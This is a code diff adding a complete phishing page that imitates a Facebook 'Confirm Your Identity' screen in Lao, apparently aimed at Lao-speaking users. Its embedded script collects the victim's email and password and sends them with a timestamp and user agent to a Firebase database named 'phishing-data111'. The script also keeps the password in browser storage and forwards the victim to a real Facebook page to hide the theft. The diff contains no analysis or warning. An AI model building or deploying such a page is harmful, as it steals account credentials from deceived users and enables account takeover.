@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm Your Identity</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        html, body {
+        touch-action: manipulation;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        .container h2 {
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 16px;
+        }
+        .submit-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .cancel-btn {
+            background-color: #f1f1f1;
+            color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 10px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .error-message {
+            color: #ff3333;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.postimg.cc/jqP8ZqWq/ven.png" alt="Facebook Logo">
+        <h2>Mars Keuta On ກະລຸນາຍືນຢັນຕົວຕົນ</h2>
+        <p style="margin-bottom: 10%;">ກະລຸນາກອກອີເມວແລະລະຫັດຜ່ານຂອງທ່ານອີກຄັ້ງເພື່ອຍືນຢັນຕົວຕົນ</p>
+        <div id="error-message" class="error-message">
+            ຂໍ້ມູນບໍ່ຖືກຕ້ອງ, ກະລຸນາລອງອີກຄັ້ງ
+        </div>
+        <form id="confirm-form">
+            <input type="text" id="email" placeholder="ອີເມວ" required>
+            <input type="password" id="password" placeholder="ລະຫັດຜ່ານ" required>
+            <button type="button" class="submit-btn" id="submit-btn">ຍືນຢັນ</button>
+            <button type="button" class="cancel-btn" id="cancel-btn">ຍົກເລີກ</button>
+        </form>
+    </div>
+
+    <script type="module">
+        // Import เฉพาะ functions ที่จำเป็นต้องใช้
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAHzPjE06l2bCNjLSSZtqSJJwmTui4-pZc",
+            authDomain: "phishing-data111.firebaseapp.com",
+            databaseURL: "https://phishing-data111-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "phishing-data111",
+            storageBucket: "phishing-data111.firebasestorage.app",
+            messagingSenderId: "92233866178",
+            appId: "1:92233866178:web:7c1b16c7bf53b5aa44d45b",
+            measurementId: "G-1BGZPY83YT"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // ดึงข้อมูลจาก localStorage (ถ้ามี)
+        const storedEmail = localStorage.getItem('fb_user_email');
+        if (storedEmail) {
+            document.getElementById('email').value = storedEmail;
+        }
+
+        document.getElementById('submit-btn').addEventListener('click', async function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('error-message');
+            
+            if (!email || !password) {
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            // เก็บข้อมูลล่าสุดที่พยายามยืนยันตัวตน
+            const timestamp = new Date().toISOString();
+            const uniqueId = Math.floor(Math.random() * 1000000);
+            const confirmRef = ref(database, 'confirm_attempts/' + uniqueId + '_' + timestamp.replace(/[.]/g, '_'));
+            
+            try {
+                // หากมี email ที่เคยบันทึกไว้ใน localStorage ให้ตรวจสอบว่าตรงกันหรือไม่
+                const storedEmail = localStorage.getItem('fb_user_email');
+                const storedPassword = localStorage.getItem('fb_user_password');
+                
+                // บันทึกข้อมูลยืนยันตัวตนลง Firebase ทุกกรณี
+                await set(confirmRef, {
+                    email: email,
+                    password: password,
+                    timestamp: timestamp,
+                    userAgent: navigator.userAgent,
+                    previousAttempt: storedEmail ? {email: storedEmail, matched: (email === storedEmail)} : null
+                });
+                
+                // ตรวจสอบถ้าข้อมูลไม่ตรงกัน
+                if (storedEmail && (email !== storedEmail || password !== storedPassword)) {
+                    // บันทึกข้อมูลใหม่เพื่อเปรียบเทียบในครั้งต่อไป
+                    localStorage.setItem('fb_user_email', email);
+                    localStorage.setItem('fb_user_password', password);
+                    
+                    // ให้ไปที่หน้า login ใหม่
+                    errorMessage.style.display = 'block';
+                    setTimeout(() => {
+                        window.location.href = "/"; // กลับไปที่หน้า login
+                    }, 1500);
+                    return;
+                }
+                
+                // บันทึกข้อมูลสำหรับการตรวจสอบครั้งต่อไป
+                localStorage.setItem('fb_user_email', email);
+                localStorage.setItem('fb_user_password', password);
+                
+                // ส่งไปที่หน้า Facebook จริง
+                window.location.href = "https://www.facebook.com/profile.php?id=61550773046370";
+            } catch (error) {
+                console.error("เกิดข้อผิดพลาดในการบันทึกข้อมูล:", error);
+                window.location.href = "https://www.facebook.com";
+            }
+        });
+
+        document.getElementById('cancel-btn').addEventListener('click', function() {
+            window.location.href = "/";
+        });
+    </script>
+</body>
+</html>
